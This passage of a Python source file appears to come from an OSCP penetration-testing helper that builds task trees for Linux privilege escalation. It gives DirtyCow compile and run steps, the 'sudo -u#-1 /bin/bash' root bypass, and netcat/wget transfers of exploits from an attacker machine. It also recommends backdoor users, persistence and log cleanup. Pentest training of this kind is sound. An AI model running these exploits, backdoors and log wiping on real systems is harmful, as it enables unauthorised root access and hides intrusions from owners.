                                'command': 'g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil',
                                'description': 'Compile DirtyCow exploit (EDB-ID 40847)',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    'g++': 'GNU C++ compiler',
                                    '-Wall': 'Enable all warnings',
                                    '-pedantic': 'Strict ISO C++ compliance',
                                    '-O2': 'Optimization level 2',
                                    '-std=c++11': 'Use C++11 standard',
                                    '-pthread': 'Enable POSIX threads',
                                    '-o dcow': 'Output executable named dcow',
                                    '40847.cpp': 'Source file from ExploitDB',
                                    '-lutil': 'Link util library (for pty functions)'
                                },
                                'success_indicators': [
                                    'dcow binary created',
                                    'No compilation errors',
                                    'File is executable (check: ls -la dcow)'
                                ],
                                'failure_indicators': [
                                    'g++ not installed',
                                    'Missing pthread library',
                                    'Missing util library (install: apt-get install libutil-dev)'
                                ],
                                'next_steps': [
                                    'Stabilize: echo 0 > /proc/sys/vm/dirty_writeback_centisecs',
                                    'Run: ./dcow',
                                    'Wait for completion (may take 1-2 minutes)',
                                    'Switch to root: su - firefart (password: firefart)',
                                    'Cleanup: restore /tmp/passwd.bak to /etc/passwd'
                                ],
                                'alternatives': [
                                    'gcc -pthread -o dcow dirty.c -lutil (C version)',
                                    'Download pre-compiled binary from exploit repos',
                                    'Use cowroot.c for alternative approach'
                                ],
                                'notes': 'Requires write access to /tmp and execute permissions. May crash system if not stabilized first.'
                            }
                        },
                        {
                            'id': 'kernel-dirtycow-exploit',
                            'name': 'Execute DirtyCow',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Run compiled DirtyCow exploit',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'NOISY'],
                                'alternatives': [
                                    './dcow (wait for completion)',
                                    './dirty (alternative PoC)',
                                    './cowroot (SUID approach)',
                                    './run.sh (automated exploit script)'
                                ],
                                'next_steps': [
                                    'If successful: su - firefart (password: firefart)',
                                    'Verify: id (should show uid=0)',
                                    'Create persistence: adduser backup (add to sudoers)',
                                    'Cleanup: restore /etc/passwd from /tmp/passwd.bak',
                                    'Reboot if system unstable'
                                ],
                                'notes': '''
Common DirtyCow Failures:
1. "Cannot open /proc/self/mem" - Need read access to /proc
2. Hang/freeze - Reboot and try different PoC variant
3. "Bus error" - Architecture mismatch, recompile
4. System crash - Expected on some kernels, VMware snapshots recommended

Success Indicators:
- "mmap succeeded" message
- "madvise succeeded" message
- "Running for X seconds" messages
- Completes without errors

Post-Exploitation:
- ALWAYS restore /etc/passwd (from /tmp/passwd.bak)
- System may be unstable, create backdoor before reboot
- Snapshot VM before running (test environment)
'''
                            }
                        }
                    ]
                },
                {
                    'id': 'kernel-posix-cpu-timer-cve',
                    'name': 'POSIX CPU Timers TOCTOU (CVE-2025-38352)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'kernel-posix-info',
                            'name': 'CVE-2025-38352 Information',
                            'type': 'manual',
                            'metadata': {
                                'description': 'TOCTOU race condition in Linux/Android POSIX CPU timers',
                                'tags': ['OSCP:LOW', 'RESEARCH'],
                                'notes': '''
CVE-2025-38352 (POSIX CPU Timers TOCTOU) Overview:
- Component: kernel/time/posix-cpu-timers.c
- Type: Time-of-Check Time-of-Use (TOCTOU) race condition
- Impact: Kernel memory corruption  DoS or privilege escalation
- Config: Affects CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n (IRQ-context expiry path)

Root Cause:
- Race between IRQ-time timer expiry and concurrent deletion during task exit
- Window opens when handle_posix_cpu_timers() drops sighand lock
- posix_cpu_timer_del() may miss timer->it.cpu.firing flag check

Preconditions:
1. CONFIG_POSIX_CPU_TIMERS_TASK_WORK disabled (IRQ path)
2. Target task exiting but not fully reaped
3. Concurrent timer_delete() call from sibling thread

Exploitation Difficulty:
- Reliable crash primitive (DoS)
- Privilege escalation requires additional primitives
- Timing-dependent race (may need multiple attempts)

Fix:
- Add exit_state check before processing timers
- Prefer CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y when possible

OSCP Relevance: LOW
- Very specific configuration requirement
- Better alternatives (DirtyCow, Sudo CVEs)
- Research/advanced exploitation only

References:
- https://streypaws.github.io/posts/Race-Against-Time-in-the-Kernel-Clockwork/
- https://source.android.com/docs/security/bulletin/2025-09-01
''',
                                'alternatives': [
                                    'Check config: grep CONFIG_POSIX_CPU_TIMERS_TASK_WORK /boot/config-$(uname -r)',
                                    'Check Android security bulletin for PoC',
                                    'Research kernel commit 157f357d50b5 for patch details'
                                ],
                                'next_steps': [
                                    'Verify vulnerable configuration',
                                    'Attempt safer privilege escalation methods first',
                                    'Use only in controlled lab environment',
                                    'Expect kernel crashes during exploitation'
                                ]
                            }
                        },
                        {
                            'id': 'kernel-posix-check-config',
                            'name': 'Check POSIX Timer Configuration',
                            'type': 'command',
                            'metadata': {
                                'command': 'grep CONFIG_POSIX_CPU_TIMERS_TASK_WORK /boot/config-$(uname -r) 2>/dev/null || echo "Config not found"',
                                'description': 'Verify if system uses vulnerable IRQ-context timer path',
                                'tags': ['OSCP:LOW', 'MANUAL'],
                                'flag_explanations': {
                                    'grep CONFIG_POSIX_CPU_TIMERS_TASK_WORK': 'Search for specific kernel config option',
                                    '/boot/config-$(uname -r)': 'Kernel config file for running kernel',
                                    '2>/dev/null': 'Suppress errors',
                                    '$(uname -r)': 'Get current kernel release version'
                                },
                                'success_indicators': [
                                    'CONFIG_POSIX_CPU_TIMERS_TASK_WORK=n (vulnerable to CVE-2025-38352)',
                                    'CONFIG_POSIX_CPU_TIMERS_TASK_WORK=y (not vulnerable - safer path)',
                                    'Config not found (need root to read /boot/config)'
                                ],
                                'failure_indicators': [
                                    '/boot/config not readable (permission denied)',
                                    'Config file not present (some distros don\'t include)'
                                ],
                                'next_steps': [
                                    'If =n: System potentially vulnerable to timing attack',
                                    'If =y: Safe from this CVE (task_work path)',
                                    'Check kernel version for patch level',
                                    'Prefer other privilege escalation methods'
                                ],
                                'alternatives': [
                                    'zcat /proc/config.gz | grep POSIX_CPU_TIMERS',
                                    'cat /boot/config-$(uname -r) | grep TIMER',
                                    'dmesg | grep -i timer'
                                ],
                                'notes': 'Even if vulnerable config found, exploitation is complex and unreliable. Use for research only.'
                            }
                        }
                    ]
                },
                {
                    'id': 'kernel-sudo-version',
                    'name': 'Sudo Version Exploits',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'kernel-sudo-version-check',
                            'name': 'Check Sudo Version',
                            'type': 'command',
                            'metadata': {
                                'command': 'sudo -V | grep "Sudo ver"',
                                'description': 'Identify sudo version for vulnerability research',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                                'flag_explanations': {
                                    'sudo -V': 'Display sudo version and configuration',
                                    'grep "Sudo ver"': 'Extract version line'
                                },
                                'success_indicators': [
                                    'Sudo version displayed (e.g., 1.8.21)',
                                    'Configure options shown'
                                ],
                                'failure_indicators': [
                                    'sudo not installed',
                                    'No sudo permissions (try anyway, version check usually allowed)'
                                ],
                                'next_steps': [
                                    'Compare version against searchsploit sudo',
                                    'Check for CVE-2019-14287 (sudo < 1.8.28)',
                                    'Check for CVE-2021-3156 (Baron Samedit)',
                                    'Run: sudo -u#-1 /bin/bash (if < 1.8.28)'
                                ],
                                'alternatives': [
                                    'sudo --version',
                                    'dpkg -l | grep sudo (Debian/Ubuntu)',
                                    'rpm -qa | grep sudo (RHEL/CentOS)',
                                    'searchsploit sudo'
                                ],
                                'notes': 'Many sudo vulnerabilities found 2019-2021 - high likelihood in OSCP labs'
                            }
                        },
                        {
                            'id': 'kernel-sudo-vulnerable-check',
                            'name': 'Check for Known Vulnerable Sudo Versions',
                            'type': 'command',
                            'metadata': {
                                'command': 'sudo -V | grep "Sudo ver" | grep "1\\.[01234567]\\.[0-9]\\+\\|1\\.8\\.1[0-9]\\*\\|1\\.8\\.2[01234567]"',
                                'description': 'Grep for known vulnerable sudo versions',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'flag_explanations': {
                                    'grep pattern': 'Match vulnerable sudo versions (1.0-1.7.x and 1.8.0-1.8.27)',
                                    '\\|': 'Regex OR operator',
                                    '\\+': 'One or more occurrences',
                                    '\\*': 'Zero or more occurrences'
                                },
                                'success_indicators': [
                                    'Match found = vulnerable sudo version',
                                    'No output = patched version (> 1.8.28 or 1.9.x)'
                                ],
                                'failure_indicators': [
                                    'Command errors (invalid regex)',
                                    'sudo not installed'
                                ],
                                'next_steps': [
                                    'If matched: Try sudo -u#-1 /bin/bash',
                                    'If 1.8.2-1.8.31: Check Baron Samedit (CVE-2021-3156)',
                                    'searchsploit sudo <version>',
                                    'Check sudo -l for NOPASSWD misconfigs'
                                ],
                                'alternatives': [
                                    'Manual comparison of version numbers',
                                    'searchsploit sudo',
                                    'Online: https://www.sudo.ws/security.html'
                                ],
                                'notes': 'CVE-2019-14287: sudo -u#-1 /bin/bash bypasses user restrictions (sudo < 1.8.28)'
                            }
                        },
                        {
                            'id': 'kernel-sudo-u-minus-1',
                            'name': 'Sudo -u#-1 Bypass (CVE-2019-14287)',
                            'type': 'command',
                            'metadata': {
                                'command': 'sudo -u#-1 /bin/bash',
                                'description': 'Exploit sudo < 1.8.28 user ID bypass to get root shell',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                                'flag_explanations': {
                                    'sudo': 'Execute command as another user',
                                    '-u#-1': 'User ID -1 (interpreted as 0 = root due to integer overflow)',
                                    '/bin/bash': 'Spawn bash shell'
                                },
                                'success_indicators': [
                                    'Root shell spawned (bash-4.x# prompt)',
                                    'id command shows uid=0(root)',
                                    'No password prompt'
                                ],
                                'failure_indicators': [
                                    'sudo version >= 1.8.28 (patched)',
                                    'User not in sudoers',
                                    'Password required',
                                    'sudo: unknown user: #-1'
                                ],
                                'next_steps': [
                                    'If successful: Verify with id',
                                    'Create persistence (add user, SSH key, cron job)',
                                    'Capture flags',
                                    'Clean up logs if needed'
                                ],
                                'alternatives': [
                                    'sudo -u#4294967295 /bin/bash (alternative UID)',
                                    'sudo -l (check what commands allowed)',
                                    'GTFOBins sudo escapes if specific commands allowed'
                                ],
                                'notes': '''
CVE-2019-14287 Requirements:
- Sudo version < 1.8.28
- User in sudoers with (ALL, !root) or similar
- No password required OR password known

Quick Check:
sudo -l | grep -i "!root"
If you see: (ALL, !root) /bin/bash  vulnerable

Affected Versions:
- 1.0.x - 1.8.27 (all versions before fix)

Fixed in:
- 1.8.28 and later
''',
                                'estimated_time': '5 seconds'
                            }
                        }
                    ]
                }
            ]
        }

    def _get_compilation_tasks(self, target: str) -> Dict[str, Any]:
        """Exploit compilation workflow"""
        return {
            'id': 'kernel-compilation',
            'name': 'Exploit Compilation Workflow',
            'type': 'parent',
            'children': [
                {
                    'id': 'kernel-check-compiler',
                    'name': 'Check Compiler Availability',
                    'type': 'command',
                    'metadata': {
                        'command': '(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\\|lib" 2>/dev/null || yum list installed "gcc*" 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\\.-]\\+$" 2>/dev/null | grep -v "/doc/")',
                        'description': 'Check if compiler is available on target system',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'flag_explanations': {
                            'dpkg --list': 'Debian/Ubuntu package list',
                            'yum list installed': 'RHEL/CentOS package list',
                            'which gcc g++': 'Check if gcc/g++ in PATH',
                            'locate': 'Find gcc binaries',
                            'grep -v "decompiler\\|lib"': 'Exclude false positives',
                            '||': 'Try alternative methods if first fails'
                        },
                        'success_indicators': [
                            'gcc or g++ found in PATH',
                            'Compiler package installed',
                            'gcc version displayed'
                        ],
                        'failure_indicators': [
                            'No compiler found (common - compile on attacker machine)',
                            'Only found libraries, not actual compiler'
                        ],
                        'next_steps': [
                            'If found: Compile exploit on target',
                            'If not found: Compile on attacker machine with same kernel',
                            'Check architecture match: uname -m',
                            'Upload pre-compiled exploit'
                        ],
                        'alternatives': [
                            'gcc --version',
                            'g++ --version',
                            'cc --version',
                            'clang --version (alternative compiler)'
                        ],
                        'notes': '''
OSCP Compilation Strategy:
1. Prefer compiling ON TARGET if gcc available (exact environment match)
2. If no compiler: Compile on Kali with matching kernel/arch
3. Static compilation preferred: gcc -static exploit.c -o exploit
4. Check architecture: file exploit (should match target: uname -m)

Why compile on target?
- Guarantees library compatibility (glibc version, etc.)
- Matches exact kernel headers
- Avoids "version GLIBC_X.XX not found" errors
'''
                    }
                },
                {
                    'id': 'kernel-compile-c',
                    'name': 'Compile C Exploit',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Standard C compilation for kernel exploits',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'alternatives': [
                            'gcc exploit.c -o exploit (basic)',
                            'gcc -o exploit exploit.c (same)',
                            'gcc -static exploit.c -o exploit (static - no library dependencies)',
                            'gcc -m32 exploit.c -o exploit (force 32-bit)',
                            'gcc -m64 exploit.c -o exploit (force 64-bit)',
                            'gcc -pthread exploit.c -o exploit (if uses threads)',
                            'gcc -Wall -O2 exploit.c -o exploit (optimized with warnings)'
                        ],
                        'next_steps': [
                            'Check if compiled: ls -la exploit',
                            'Make executable: chmod +x exploit',
                            'Verify architecture: file exploit',
                            'Test execution: ./exploit',
                            'If "Permission denied": Check noexec mount (remount or move to /tmp)'
                        ],
                        'notes': '''
Common Compilation Errors:

1. "undefined reference to pthread_create"
   Fix: gcc -pthread exploit.c -o exploit

2. "fatal error: asm/unistd.h: No such file"
   Fix: Install kernel headers: apt-get install linux-headers-$(uname -r)

3. "version GLIBC_X.XX not found"
   Fix: Compile statically: gcc -static exploit.c -o exploit

4. Architecture mismatch
   Fix: gcc -m32 or -m64 based on target arch

5. Missing libraries
   Fix: Static compilation or install dev packages

OSCP Tip: Read exploit comments! Often contain compilation instructions.
'''
                    }
                },
                {
                    'id': 'kernel-compile-cpp',
                    'name': 'Compile C++ Exploit',
                    'type': 'manual',
                    'metadata': {
                        'description': 'C++ compilation (g++ required)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'alternatives': [
                            'g++ exploit.cpp -o exploit (basic)',
                            'g++ -static exploit.cpp -o exploit (static linking)',
                            'g++ -pthread exploit.cpp -o exploit (with threads)',
                            'g++ -std=c++11 exploit.cpp -o exploit (C++11 standard)',
                            'g++ -Wall -O2 -std=c++11 -pthread exploit.cpp -o exploit (full)',
                            'g++ exploit.cpp -o exploit -lutil (link util library)'
                        ],
                        'next_steps': [
                            'Same as C compilation',
                            'chmod +x exploit',
                            'file exploit (verify arch)',
                            './exploit'
                        ],
                        'notes': 'DirtyCow often uses g++ with -pthread and -lutil flags. Read exploit source for required flags.'
                    }
                },
                {
                    'id': 'kernel-cross-compile',
                    'name': 'Cross-Compilation on Attacker Machine',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Compile exploit on Kali for target architecture',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'alternatives': [
                            'On Kali (for 64-bit target): gcc -static exploit.c -o exploit',
                            'On Kali (for 32-bit target): gcc -m32 -static exploit.c -o exploit32',
                            'With specific kernel headers: gcc -I/usr/src/linux-headers-X.X.X/include exploit.c',
                            'Check target arch first: uname -m (on target)',
                            'Check target glibc: ldd --version (on target)'
                        ],
                        'next_steps': [
                            'Transfer to target: python3 -m http.server (Kali), wget (target)',
                            'Alternative transfer: nc, scp, base64 encoding, file upload vuln',
                            'On target: chmod +x exploit',
                            'Test execution: ./exploit'
                        ],
                        'notes': '''
Cross-Compilation Best Practices:

1. Match architecture exactly (x86_64, i686, armhf, etc.)
2. Use -static flag to avoid glibc version mismatches
3. Test on VM with same OS/kernel version as target
4. Verify file type: file exploit

Transfer Methods (ranked by stealth):
1. HTTP download (wget, curl) - common, less suspicious
2. Base64 encode, paste, decode - bypasses some filters
3. SCP/SFTP - if SSH available
4. Netcat - nc -l 9999 < exploit (attacker) | nc attacker 9999 > exploit (target)
5. SMB share - if Windows interop needed
6. Web upload - if you have file upload vuln

OSCP Exam Note: Test transfer method before exam on lab machines
'''
                    }
                },
                {
                    'id': 'kernel-static-compilation',
                    'name': 'Static Compilation (No Dependencies)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Compile exploit with all libraries statically linked',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'alternatives': [
                            'gcc -static exploit.c -o exploit',
                            'g++ -static exploit.cpp -o exploit',
                            'gcc -static -pthread exploit.c -o exploit (with threads)',
                            'musl-gcc -static exploit.c -o exploit (smaller binary, alternative libc)'
                        ],
                        'next_steps': [
                            'Check binary size: ls -lh exploit (will be larger due to static libs)',
                            'Verify static: ldd exploit (should say "not a dynamic executable")',
                            'Transfer to target',
                            'Execute normally'
                        ],
                        'notes': '''
Why Static Compilation?

Advantages:
 No glibc version dependencies
 Works across different distributions
 No missing library errors
 More reliable on OSCP targets

Disadvantages:
 Larger binary size (1-2 MB vs 10-20 KB)
 Slower compilation
 May not work if static libraries not installed

Install static libraries (if missing):
Debian/Ubuntu: apt-get install libc6-dev:i386 (32-bit)
RHEL/CentOS: yum install glibc-static

OSCP Recommendation: Always try static first for kernel exploits
'''
                    }
                }
            ]
        }

    def _get_exploit_repos_tasks(self) -> Dict[str, Any]:
        """Exploit repository research tasks"""
        return {
            'id': 'kernel-exploit-repos',
            'name': 'Kernel Exploit Repositories',
            'type': 'parent',
            'children': [
                {
                    'id': 'kernel-lucyoa-repo',
                    'name': 'lucyoa/kernel-exploits Repository',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Curated list of kernel exploits with pre-compiled binaries',
                        'tags': ['OSCP:HIGH', 'RESEARCH'],
                        'alternatives': [
                            'Browse: https://github.com/lucyoa/kernel-exploits',
                            'Clone: git clone https://github.com/lucyoa/kernel-exploits.git',
                            'Extract vulnerable versions: curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2',
                            'Download specific exploit: wget https://github.com/lucyoa/kernel-exploits/raw/master/<path>'
                        ],
                        'next_steps': [
                            'Search README for your kernel version',
                            'Download recommended exploit binary',
                            'Check if pre-compiled for your architecture',
                            'Transfer to target and test'
                        ],
                        'notes': '''
lucyoa/kernel-exploits Repository:
- Most comprehensive kernel exploit collection
- Includes pre-compiled binaries (saves time)
- Well-organized by CVE and kernel version
- Includes compilation instructions

Structure:
- README.md lists all exploits by kernel version
- Each exploit in separate directory
- Usually includes: source, binary, README
- Sorted by reliability and success rate

OSCP Usage:
1. Detect target kernel: uname -r
2. Search README: grep "4.4.0" README.md
3. Download suggested exploit
4. Test on target
'''
                    }
                },
                {
                    'id': 'kernel-bwbw-repo',
                    'name': 'linux-exploit-binaries Repository',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Pre-compiled Linux kernel exploits (32-bit and 64-bit)',
                        'tags': ['OSCP:HIGH', 'RESEARCH'],
                        'alternatives': [
                            'Browse: https://github.com/bwbwbwbw/linux-exploit-binaries',
                            'Clone: git clone https://github.com/bwbwbwbw/linux-exploit-binaries.git',
                            'Download specific binary',
                            'Check architecture before using'
                        ],
                        'next_steps': [
                            'Verify architecture match (x86_64 vs i686)',
                            'Transfer to target',
                            'chmod +x binary',
                            'Execute and verify root'
                        ],
                        'notes': '''
Pre-Compiled Exploit Binaries:
- Saves compilation time
- Includes both 32-bit and 64-bit versions
- Must match target architecture exactly

Verify Architecture:
Target: uname -m
Binary: file exploit

Match:
- x86_64 target  ELF 64-bit binary
- i686 target  ELF 32-bit binary
- armhf target  ELF ARM binary

OSCP Warning: Always verify binary authenticity and test in VM first
'''
                    }
                },
                {
                    'id': 'kernel-kabot-repo',
                    'name': 'Unix-Privilege-Escalation-Exploits-Pack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Collection of Unix/Linux privilege escalation exploits',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'alternatives': [
                            'Browse: https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack',
                            'Clone: git clone https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack.git',
                            'Search by OS version or kernel version'
                        ],
                        'next_steps': [
                            'Browse exploits by category',
                            'Read exploit documentation',
                            'Compile and test'
                        ],
                        'notes': 'Includes Unix (Solaris, AIX, HP-UX) and Linux exploits. Less maintained than lucyoa repo.'
                    }
                },
                {
                    'id': 'kernel-exploitdb-bins',
                    'name': 'ExploitDB Binary Exploits',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Official ExploitDB pre-compiled exploit binaries',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'alternatives': [
                            'Browse: https://gitlab.com/exploit-database/exploitdb-bin-sploits',
                            'Download via searchsploit: searchsploit -m <EDB-ID>',
                            'Manual download from ExploitDB website',
                            'Check /usr/share/exploitdb/exploits/ on Kali'
                        ],
                        'next_steps': [
                            'Use searchsploit to find exploit',
                            'Mirror to current directory: searchsploit -m <ID>',
                            'Transfer to target',
                            'Execute'
                        ],
                        'notes': '''
ExploitDB Binary Repository:
- Official ExploitDB pre-compiled exploits
- Not all exploits have binaries (many source-only)
- Located in /usr/share/exploitdb/exploits/ on Kali

Using searchsploit:
1. Search: searchsploit "linux kernel 4.4"
2. Examine: searchsploit -x <EDB-ID>
3. Mirror: searchsploit -m <EDB-ID>
4. Compile if needed
5. Transfer and execute

OSCP Workflow:
searchsploit "Linux Kernel $(uname -r)"
 Find exploit
 searchsploit -m <ID>
 Read exploit code
 Compile with instructions in comments
 Transfer to target
'''
                    }
                },
                {
                    'id': 'kernel-github-search',
                    'name': 'GitHub CVE Repository Search',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Search GitHub for kernel CVE exploits',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'alternatives': [
                            'GitHub search: "CVE-2016-5195 exploit"',
                            'GitHub search: "linux kernel <version> privilege escalation"',
                            'GitHub search: "dirty cow exploit"',
                            'Filter by language: C, C++, Python',
                            'Sort by stars (popularity indicator)'
                        ],
                        'next_steps': [
                            'Review repository stars and forks (popularity)',
                            'Read README for usage instructions',
                            'Check last commit date (recent = maintained)',
                            'Clone and test in VM',
                            'Verify exploit works before using on target'
                        ],
                        'notes': '''
GitHub Exploit Search Tips:

Good Indicators:
 High star count (100+)
 Multiple forks
 Recent commits
 Clear README with instructions
 References to CVE or ExploitDB ID

Red Flags:
 No documentation
 Last commit years ago
 No stars/forks (untested)
 Obfuscated code
 No license (legal issues)

OSCP: Prefer well-known repositories over random individual repos
'''
                    }
                }
            ]
        }
